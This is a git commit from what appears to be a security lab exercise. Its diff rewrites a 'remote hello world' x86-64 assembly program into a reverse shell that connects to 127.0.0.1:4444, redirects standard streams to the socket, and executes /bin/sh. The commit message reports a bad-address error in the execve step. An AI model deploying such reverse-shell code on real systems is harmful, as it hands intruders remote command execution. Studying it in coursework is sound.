54d990dc73e03de71d30d3b4321103a73438be34
Christian Sylvester <christians@localhost.localdomain>
2018-08-25 18:08:57 -0600

    pex1 error of efault (bad addr) for the shell execution

--- pex1.asm
+++ pex1.asm
@@ -1,36 +1,75 @@
 ;Lab3_3 Remote Hello World
 SECTION .data
-	msg db "Hello, World!", 10, 0
+	msg: db "/bin/sh", 0
+	errExit: db "There was an error.  Please check the debugger.", 10, 0
+	cleanExit: db "The program exited without error.", 10, 0
 
 SECTION .text
 global _start
 
 _start:
-	mov rax, 41
+	mov rax, 41			;socket call code
 	mov rdi, 2			;inet
 	mov rsi, 1			;sock_stream
 	mov rdx, 0			;protocol
-	syscall	;sys_socket
-	mov rdi, rax			;fd
-	mov rax, 42
+	syscall				;sys_socket
+	cmp rax, 0			;check for error return
+	jl .error
+	mov r12, rax			;fd
+	mov rax, 42			;connect call code
 	mov rdx, 16			;addrlen
 	mov dword [rsp-4], 0x0100007f	;inet addr 127.0.0.1
 	mov word [rsp-6], 0x5c11	;port 4444
 	mov byte [rsp-8], 2		;inet
 	sub rsp, 8			;stack alignment
- 	mov rsi, rsp;	need the pointer to the value not the data@ rsp [rsp]			;sock_addr
-	syscall ;sys_connect
-	cmp rax, 0
-	jle
-	mov rax, 44
-	mov rsi, msg			;send hello world
-	mov rdx, 16			;length of msg
-	mov r10, 0			;flags
-	mov r9, [rsp]			;sock_addr
-	mov r8, 8			;addrlen
-	syscall ;sys_sendto
+ 	mov rsi, rsp			;sock_addr
+	mov rdi, r12			;move fd into rdi for parameter
+	syscall 			;sys_connect
+	cmp rax, 0			;check for error return
+	jl .error
+	mov rax, 33			;indicates dup2
+	mov rsi, 0			;move old file descriptor to new param
+	mov rdi, r12			;indicate file descriptor
+	syscall				;dup2 for stdin
+	cmp rax, 0			;check for error return
+	jl .error
+	mov rax, 33			;indicates dup2
+	mov rsi, 1			;move stdout
+	mov rdi, r12			;indicate file descriptor
+	syscall				;dup2 for stdout
+	cmp rax, 0			;check for error return
+	jl .error
+	mov rax, 33			;indicates dup2
+	mov rsi, 2			;mov stderr
+	mov rdi, r12			;indicate file descriptor
+	syscall				;dup2 for stderr
+	cmp rax, 0			;check for error return
+	jl .error
+	mov rax, 59			;execve call code
+	mov rdi, msg			;send /bin/sh
+	;mov rdx, 7			;length of msg
+	;mov r10, 0			;flags
+	;mov r8, [rsp]			;sock_addr
+	;mov r9, 0x10			;addrlen
+	syscall 			;sys_execve
+	cmp rax, 0			;check for error return
+	jl .error			;go to the error print
+	mov rax, 1			;write call code
+	mov rdi, 1			;stdout
+	mov rsi, cleanExit		;send the clean exit message
+	mov rdx, 35			;the length of the message
+	syscall				;call the write
+	mov rdi, 0			;no error code
+	jmp .exit			;exit cleanly at end of program
 .exit:
-	mov rax, 60
-	mov rdi, 0
+	mov rax, 60			;exit call code
 	syscall ;sys_exit
-
+.error:
+	mov r13, rax			;error code for storage
+	mov rax, 1			;write call code
+	mov rdi, 1			;stdout
+	mov rsi, errExit		;send the error message to call
+	mov rdx, 49			;length of the error message
+	syscall				;call the write
+	mov rdi, r13			;mov the error code to the exit call
+	jmp .exit			;leave the program
